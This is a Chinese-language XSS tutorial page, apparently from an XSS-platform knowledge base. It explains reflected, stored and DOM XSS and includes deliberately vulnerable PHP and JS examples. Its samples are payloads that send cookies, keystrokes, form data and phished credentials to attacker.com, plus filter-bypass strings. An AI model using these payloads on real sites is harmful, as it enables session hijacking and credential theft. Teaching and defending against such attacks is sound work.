@@ -1,0 +1,759 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+    <meta name="description" content="XSS跨站脚本攻击完全入门教程，深入讲解XSS原理、攻击类型、实战案例及防御方法。从零开始掌握Web安全核心知识。">
+    <meta name="keywords" content="XSS,跨站脚本攻击,Web安全,XSS入门,XSS教程,反射型XSS,存储型XSS,DOM XSS,安全测试">
+    <meta name="author" content="蓝莲花XSS平台">
+    <meta property="og:title" content="XSS跨站脚本攻击完全入门 - XSS安全知识库">
+    <meta property="og:description" content="从零开始学习XSS攻击技术，包含原理、类型、案例及防御策略的完整教程">
+    <meta property="og:type" content="article">
+    <title>XSS跨站脚本攻击完全入门 - XSS安全知识库</title>
+    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
+    
+    <style>
+        .article-header {
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 20, 10, 0.95) 100%);
+            padding: 80px 0 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .article-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 65, 0.03) 0px,
+                transparent 2px,
+                transparent 4px
+            );
+            pointer-events: none;
+        }
+        
+        .breadcrumb {
+            background: transparent;
+            padding: 0;
+            margin-bottom: 1rem;
+        }
+        
+        .breadcrumb-item a {
+            color: var(--neon-green);
+            text-decoration: none;
+        }
+        
+        .breadcrumb-item.active {
+            color: var(--text-secondary);
+        }
+        
+        .article-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, #00ff41, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+        
+        .article-meta {
+            color: var(--text-tertiary);
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+        
+        .article-content {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 3rem;
+            margin: 2rem 0;
+        }
+        
+        .article-content h2 {
+            color: var(--neon-green);
+            font-size: 1.8rem;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--border-color);
+        }
+        
+        .article-content h3 {
+            color: var(--text-highlight);
+            font-size: 1.4rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .article-content h4 {
+            color: var(--cyan);
+            font-size: 1.2rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+        }
+        
+        .article-content p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+        
+        .article-content ul, .article-content ol {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: 1rem;
+            padding-left: 2rem;
+        }
+        
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+        
+        .code-block pre {
+            margin: 0;
+            color: var(--text-primary);
+        }
+        
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box h4 {
+            color: #ffc107;
+            margin-top: 0;
+        }
+        
+        .info-box {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid var(--neon-green);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .info-box h4 {
+            color: var(--neon-green);
+            margin-top: 0;
+        }
+        
+        .danger-box {
+            background: rgba(220, 53, 69, 0.1);
+            border-left: 4px solid #dc3545;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .danger-box h4 {
+            color: #dc3545;
+            margin-top: 0;
+        }
+        
+        .toc {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .toc h3 {
+            color: var(--neon-green);
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .toc ul ul {
+            padding-left: 1.5rem;
+        }
+        
+        .toc a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .toc a:hover {
+            color: var(--neon-green);
+        }
+        
+        .article-nav {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .article-nav a {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            padding: 1rem 1.5rem;
+            border-radius: var(--border-radius);
+            color: var(--neon-green);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .article-nav a:hover {
+            background: rgba(0, 255, 65, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        @media (max-width: 768px) {
+            .article-title {
+                font-size: 1.8rem;
+            }
+            
+            .article-content {
+                padding: 1.5rem;
+            }
+        }
+        
+        /* 回到顶部按钮 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <!-- Article Header -->
+    <div class="article-header">
+        <div class="container">
+            <nav aria-label="breadcrumb">
+                <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="../wiki.html"><i class="fas fa-book"></i> 知识库</a></li>
+                    <li class="breadcrumb-item active">XSS跨站脚本攻击完全入门</li>
+                </ol>
+            </nav>
+            <h1 class="article-title">XSS跨站脚本攻击完全入门</h1>
+            <div class="article-meta">
+                <span><i class="far fa-calendar"></i> 2025年12月</span>
+                <span class="mx-3">|</span>
+                <span><i class="far fa-clock"></i> 15分钟阅读</span>
+                <span class="mx-3">|</span>
+                <span><i class="fas fa-tag"></i> 基础知识</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-10 offset-lg-1">
+                    <!-- Table of Contents -->
+                    <div class="toc">
+                        <h3><i class="fas fa-list"></i> 目录</h3>
+                        <ul>
+                            <li><a href="#what-is-xss">1. 什么是XSS？</a></li>
+                            <li><a href="#how-xss-works">2. XSS是如何工作的？</a></li>
+                            <li><a href="#xss-examples">3. 简单的XSS示例</a></li>
+                            <li><a href="#xss-dangers">4. XSS的危害</a></li>
+                            <li><a href="#why-common">5. 为什么XSS如此常见？</a></li>
+                            <li><a href="#real-cases">6. 真实世界的XSS案例</a></li>
+                            <li><a href="#summary">7. 总结</a></li>
+                        </ul>
+                    </div>
+                    
+                    <!-- Article Content -->
+                    <div class="article-content">
+                        <h2 id="what-is-xss">1. 什么是XSS？</h2>
+                        <p>
+                            XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的Web应用程序安全漏洞，攻击者通过在网页中注入恶意脚本代码，当其他用户浏览该网页时，注入的脚本会在受害者的浏览器中执行。
+                        </p>
+                        
+                        <p>
+                            <strong>为什么叫"跨站"脚本？</strong>因为攻击者注入的脚本可以访问和操作与当前网站相关的敏感信息（如Cookie、会话令牌等），并可能将这些信息发送到攻击者控制的服务器上，从而实现"跨站"的数据窃取。
+                        </p>
+                        
+                        <div class="info-box">
+                            <h4><i class="fas fa-info-circle"></i> 名称由来</h4>
+                            <p>XSS最初被称为CSS（Cross-Site Scripting），但为了避免与层叠样式表（Cascading Style Sheets）的缩写混淆，改用了XSS这个缩写。X代表"Cross"的首字母。</p>
+                        </div>
+                        
+                        <h3>XSS的本质</h3>
+                        <p>
+                            XSS的本质是<strong>代码注入</strong>。当Web应用程序没有正确地验证、过滤或转义用户输入时，攻击者就可以注入JavaScript、HTML或其他客户端脚本代码，这些代码会被浏览器当作合法内容执行。
+                        </p>
+                        
+                        <p>简单来说，XSS利用的核心问题是：</p>
+                        <ul>
+                            <li><strong>信任问题</strong>：浏览器信任网站返回的所有内容</li>
+                            <li><strong>输入输出问题</strong>：网站未正确处理用户输入就直接输出到页面</li>
+                            <li><strong>同源策略</strong>：注入的脚本在受害者浏览器中与目标网站处于同一源，可以访问网站的所有资源</li>
+                        </ul>
+                        
+                        <h2 id="how-xss-works">2. XSS是如何工作的？</h2>
+                        <p>
+                            要理解XSS的工作原理，我们需要了解Web应用程序的基本工作流程：
+                        </p>
+                        
+                        <h3>正常的Web交互流程</h3>
+                        <ol>
+                            <li>用户在浏览器中访问网站（发送HTTP请求）</li>
+                            <li>服务器处理请求并生成HTML页面</li>
+                            <li>浏览器接收HTML并解析渲染</li>
+                            <li>浏览器执行页面中的JavaScript代码</li>
+                        </ol>
+                        
+                        <h3>XSS攻击流程</h3>
+                        <ol>
+                            <li><strong>攻击者发现漏洞</strong>：找到一个接受用户输入并直接显示在页面上的地方</li>
+                            <li><strong>构造恶意Payload</strong>：编写包含恶意JavaScript代码的输入</li>
+                            <li><strong>注入脚本</strong>：通过表单、URL参数、Cookie等方式提交恶意代码</li>
+                            <li><strong>受害者触发</strong>：其他用户访问包含恶意代码的页面</li>
+                            <li><strong>脚本执行</strong>：浏览器执行注入的恶意脚本</li>
+                            <li><strong>数据窃取</strong>：脚本窃取敏感信息并发送到攻击者服务器</li>
+                        </ol>
+                        
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!-- 存在漏洞的搜索功能 --&gt;
+&lt;?php
+  $search = $_GET['q'];  // 获取用户搜索关键词
+  echo "您搜索的内容是：" . $search;  // 直接输出，未做任何过滤
+?&gt;
+
+&lt;!-- 正常用户搜索 "hello" --&gt;
+URL: http://example.com/search.php?q=hello
+输出: 您搜索的内容是：hello
+
+&lt;!-- 攻击者构造恶意URL --&gt;
+URL: http://example.com/search.php?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+输出: 您搜索的内容是：&lt;script&gt;alert('XSS')&lt;/script&gt;
+结果: 浏览器执行脚本，弹出警告框</code></pre>
+                        </div>
+                        
+                        <h2 id="xss-examples">3. 简单的XSS示例</h2>
+                        <p>
+                            让我们通过几个具体的例子来理解XSS攻击：
+                        </p>
+                        
+                        <h3>示例1：反射型XSS - 搜索框漏洞</h3>
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!-- 存在漏洞的代码 --&gt;
+&lt;form action="search.php" method="GET"&gt;
+    &lt;input type="text" name="keyword" placeholder="搜索..."&gt;
+    &lt;button type="submit"&gt;搜索&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;?php
+if(isset($_GET['keyword'])) {
+    echo "&lt;h2&gt;搜索结果：" . $_GET['keyword'] . "&lt;/h2&gt;";
+}
+?&gt;</code></pre>
+                        </div>
+                        
+                        <p><strong>攻击方式：</strong></p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 攻击者输入以下内容：
+&lt;script&gt;
+    // 窃取Cookie
+    var img = new Image();
+    img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
+&lt;/script&gt;
+
+// 或者更隐蔽的方式：
+&lt;img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)"&gt;</code></pre>
+                        </div>
+                        
+                        <h3>示例2：存储型XSS - 评论功能漏洞</h3>
+                        <div class="code-block">
+                            <pre><code class="language-php">&lt;!-- 存在漏洞的评论系统 --&gt;
+&lt;?php
+// 保存评论（未过滤）
+if(isset($_POST['comment'])) {
+    $comment = $_POST['comment'];
+    $db->query("INSERT INTO comments (content) VALUES ('$comment')");
+}
+
+// 显示评论（未转义）
+$result = $db->query("SELECT * FROM comments");
+while($row = $result->fetch_assoc()) {
+    echo "&lt;div class='comment'&gt;" . $row['content'] . "&lt;/div&gt;";
+}
+?&gt;</code></pre>
+                        </div>
+                        
+                        <p><strong>攻击Payload：</strong></p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 攻击者发表以下评论：
+&lt;script&gt;
+// 键盘记录器
+document.addEventListener('keypress', function(e) {
+    fetch('http://attacker.com/log', {
+        method: 'POST',
+        body: 'key=' + e.key
+    });
+});
+&lt;/script&gt;
+
+// 所有查看该评论的用户都会被植入键盘记录器</code></pre>
+                        </div>
+                        
+                        <h3>示例3：DOM型XSS - 客户端渲染漏洞</h3>
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!-- 存在漏洞的JavaScript代码 --&gt;
+&lt;script&gt;
+// 从URL获取参数并显示
+var name = new URLSearchParams(window.location.search).get('name');
+document.getElementById('welcome').innerHTML = "欢迎, " + name;
+&lt;/script&gt;
+
+&lt;!-- 攻击URL --&gt;
+http://example.com/index.html?name=&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre>
+                        </div>
+                        
+                        <h2 id="xss-dangers">4. XSS的危害</h2>
+                        <p>
+                            很多开发者认为XSS只是弹个警告框，危害不大。这是一个严重的误解！XSS的危害远比想象中严重：
+                        </p>
+                        
+                        <h3>4.1 Cookie和会话劫持</h3>
+                        <p>
+                            这是XSS最常见的利用方式。攻击者可以窃取用户的Session Cookie，从而冒充用户身份登录系统。
+                        </p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// Cookie窃取脚本
+(function() {
+    var cookies = document.cookie;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://attacker.com/steal.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('cookie=' + encodeURIComponent(cookies) + 
+             '&url=' + encodeURIComponent(window.location.href));
+})();</code></pre>
+                        </div>
+                        
+                        <div class="danger-box">
+                            <h4><i class="fas fa-exclamation-triangle"></i> 真实案例</h4>
+                            <p>2019年，某大型社交网站因XSS漏洞导致超过10万用户的Session Cookie被窃取，攻击者利用这些Cookie登录用户账户，发送垃圾信息和钓鱼链接。</p>
+                        </div>
+                        
+                        <h3>4.2 键盘记录和表单劫持</h3>
+                        <p>
+                            攻击者可以监听用户的所有键盘输入，包括用户名、密码、信用卡号等敏感信息。
+                        </p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 键盘记录脚本
+document.addEventListener('keypress', function(event) {
+    fetch('http://attacker.com/keylog.php', {
+        method: 'POST',
+        body: JSON.stringify({
+            key: event.key,
+            time: new Date().toISOString(),
+            url: window.location.href
+        })
+    });
+});
+
+// 表单劫持
+document.querySelectorAll('form').forEach(function(form) {
+    form.addEventListener('submit', function(e) {
+        var formData = new FormData(form);
+        fetch('http://attacker.com/formdata.php', {
+            method: 'POST',
+            body: formData
+        });
+    });
+});</code></pre>
+                        </div>
+                        
+                        <h3>4.3 钓鱼攻击</h3>
+                        <p>
+                            攻击者可以修改页面内容，插入假的登录表单来窃取用户凭据。
+                        </p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 插入假登录框
+document.body.innerHTML = `
+&lt;div style="
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    padding: 30px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    z-index: 9999;
+"&gt;
+    &lt;h2&gt;会话已过期，请重新登录&lt;/h2&gt;
+    &lt;form id="phishForm"&gt;
+        &lt;input type="text" name="username" placeholder="用户名" required&gt;&lt;br&gt;
+        &lt;input type="password" name="password" placeholder="密码" required&gt;&lt;br&gt;
+        &lt;button type="submit"&gt;登录&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+`;
+
+document.getElementById('phishForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    // 发送到攻击者服务器
+    fetch('http://attacker.com/phish.php', {
+        method: 'POST',
+        body: new FormData(this)
+    }).then(() => {
+        // 然后重定向到真实登录页面
+        window.location.href = '/login.php';
+    });
+});</code></pre>
+                        </div>
+                        
+                        <h3>4.4 恶意重定向和广告注入</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 恶意重定向
+window.location.href = 'http://malicious-site.com/malware.exe';
+
+// 注入广告
+var ad = document.createElement('iframe');
+ad.src = 'http://ad-network.com/popup';
+ad.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999';
+document.body.appendChild(ad);</code></pre>
+                        </div>
+                        
+                        <h3>4.5 蠕虫传播</h3>
+                        <p>
+                            在某些社交网站上，XSS可以实现自我复制传播，形成蠕虫攻击。
+                        </p>
+                        <div class="warning-box">
+                            <h4><i class="fas fa-bug"></i> 著名的Samy蠕虫</h4>
+                            <p>2005年，Samy Kamkar利用MySpace的XSS漏洞创建了一个自我传播的XSS蠕虫。该蠕虫会自动将访问者添加为Samy的好友，并在访问者的个人主页中复制蠕虫代码。短短20小时内，Samy获得了超过100万好友，成为MySpace历史上最流行的用户。</p>
+                        </div>
+                        
+                        <h2 id="why-common">5. 为什么XSS如此常见？</h2>
+                        <p>
+                            根据OWASP（开放式Web应用程序安全项目）的统计，XSS长期位列Web应用程序十大安全风险之中。为什么XSS如此常见？
+                        </p>
+                        
+                        <h3>5.1 开发者安全意识不足</h3>
+                        <ul>
+                            <li>许多开发者不了解XSS的危害，认为"只是弹个框"</li>
+                            <li>新手开发者不知道需要对用户输入进行验证和转义</li>
+                            <li>赶工期导致忽视安全性考虑</li>
+                        </ul>
+                        
+                        <h3>5.2 用户输入点众多</h3>
+                        <p>
+                            现代Web应用程序有大量的用户输入点，每一个都可能成为XSS的入口：
+                        </p>
+                        <ul>
+                            <li>表单输入（搜索框、评论、个人资料等）</li>
+                            <li>URL参数</li>
+                            <li>HTTP请求头（User-Agent、Referer等）</li>
+                            <li>Cookie</li>
+                            <li>文件上传（文件名、元数据）</li>
+                            <li>WebSocket消息</li>
+                            <li>API返回数据</li>
+                        </ul>
+                        
+                        <h3>5.3 复杂的前端技术栈</h3>
+                        <p>
+                            现代Web应用使用复杂的前端框架（React、Vue、Angular等），虽然这些框架提供了一定的XSS防护，但仍可能因为不当使用而产生漏洞：
+                        </p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// React中的危险用法
+&lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;
+
+// Vue中的危险用法
+&lt;div v-html="userInput"&gt;&lt;/div&gt;
+
+// Angular中的危险用法
+&lt;div [innerHTML]="userInput"&gt;&lt;/div&gt;</code></pre>
+                        </div>
+                        
+                        <h3>5.4 第三方组件和依赖</h3>
+                        <p>
+                            现代应用依赖大量第三方库和组件，任何一个组件的XSS漏洞都可能影响整个应用。
+                        </p>
+                        
+                        <h3>5.5 复杂的攻击向量</h3>
+                        <p>
+                            攻击者有无数种方式绕过简单的过滤机制：
+                        </p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 大小写变换
+&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;
+
+// 编码绕过
+&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"&gt;
+
+// 双写绕过（如果过滤器只删除一次script）
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;/script&gt;ipt&gt;
+
+// 事件处理器
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+
+// JavaScript伪协议
+&lt;a href="javascript:alert('XSS')"&gt;点击&lt;/a&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code></pre>
+                        </div>
+                        
+                        <h2 id="real-cases">6. 真实世界的XSS案例</h2>
+                        
+                        <h3>案例1：Twitter XSS蠕虫（2010）</h3>
+                        <p>
+                            2010年9月，Twitter遭遇了一次大规模XSS攻击。攻击者利用Twitter的一个XSS漏洞，创建了一条包含恶意JavaScript的推文。当用户将鼠标悬停在该推文的链接上时，就会自动转发这条推文，形成了蠕虫式传播。
+                        </p>
+                        <div class="info-box">
+                            <h4><i class="fas fa-history"></i> 影响</h4>
+                            <p>该漏洞在几小时内影响了数万用户，导致大量垃圾信息和恶意链接的传播。Twitter紧急修复了该漏洞并清理了恶意推文。</p>
+                        </div>
+                        
+                        <h3>案例2：eBay存储型XSS（2016）</h3>
+                        <p>
+                            2016年，安全研究人员在eBay上发现了一个存储型XSS漏洞。攻击者可以在商品描述中插入恶意脚本，当其他用户浏览该商品时，脚本会在他们的浏览器中执行。
+                        </p>
+                        
+                        <h3>案例3：Facebook XSS漏洞（2015）</h3>
+                        <p>
+                            安全研究人员发现Facebook的某个功能存在XSS漏洞，攻击者可以通过特制的URL注入JavaScript代码。该漏洞可以用来窃取用户的访问令牌，从而完全控制用户账户。
+                        </p>
+                        
+                        <h2 id="summary">7. 总结</h2>
+                        <p>
+                            XSS是Web安全领域最常见也最危险的漏洞之一。通过本文，我们了解了：
+                        </p>
+                        
+                        <ul>
+                            <li><strong>XSS的定义</strong>：一种代码注入攻击，攻击者通过在网页中注入恶意脚本来攻击其他用户</li>
+                            <li><strong>XSS的工作原理</strong>：利用Web应用对用户输入处理不当，将恶意代码注入到页面中</li>
+                            <li><strong>XSS的危害</strong>：不仅仅是弹框，还包括Cookie窃取、键盘记录、钓鱼、蠕虫传播等严重后果</li>
+                            <li><strong>XSS的普遍性</strong>：由于开发者安全意识不足、输入点众多、技术栈复杂等原因，XSS漏洞非常常见</li>
+                            <li><strong>真实案例</strong>：Twitter、eBay、Facebook等知名网站都曾遭受XSS攻击</li>
+                        </ul>
+                        
+                        <div class="info-box">
+                            <h4><i class="fas fa-graduation-cap"></i> 下一步学习</h4>
+                            <p>在掌握了XSS的基础知识后，建议继续学习：</p>
+                            <ul>
+                            <li><a href="xss-types.html" style="color: var(--neon-green);">XSS的三大类型详解</a>（反射型、存储型、DOM型）</li>
+                            <li><a href="xss-payload.html" style="color: var(--neon-green);">XSS Payload编写技巧</a></li>
+                            <li><a href="xss-defense.html" style="color: var(--neon-green);">XSS防御完全指南</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="warning-box">
+                            <h4><i class="fas fa-shield-alt"></i> 免责声明</h4>
+                            <p>本文所述内容仅用于教育和安全研究目的。未经授权对他人系统进行渗透测试是违法行为。请在合法授权的范围内进行安全测试。</p>
+                        </div>
+                    </div>
+                    
+                    <!-- Article Navigation -->
+                    <div class="article-nav">
+                        <a href="../wiki.html">
+                            <i class="fas fa-arrow-left"></i> 返回知识库
+                        </a>
+                        <a href="xss-types.html">
+                            下一篇：XSS三大类型详解 <i class="fas fa-arrow-right"></i>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container-fluid">
+            <div class="footer-content">
+                <div class="footer-copyright">
+                    <span>© 2025 蓝莲花XSS在线平台</span>
+                    <span class="text-tertiary">|</span>
+                    <span class="text-secondary">v2.0.8</span>
+                </div>
+                <div class="footer-links">
+                    <a href="../index.html"><i class="fas fa-home"></i> 返回首页</a>
+                    <a href="../login.php"><i class="fas fa-sign-in-alt"></i> 登录平台</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- 回到顶部按钮 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+    <script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="../static/libs/prism/js/prism.min.js"></script>
+    <script src="../static/libs/prism/js/prism-javascript.min.js"></script>
+    <script src="../static/libs/prism/js/prism-markup.min.js"></script>
+    <script src="../static/libs/prism/js/prism-php.min.js"></script>
+    <script>
+        // 回到顶部功能
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body>
+</html>
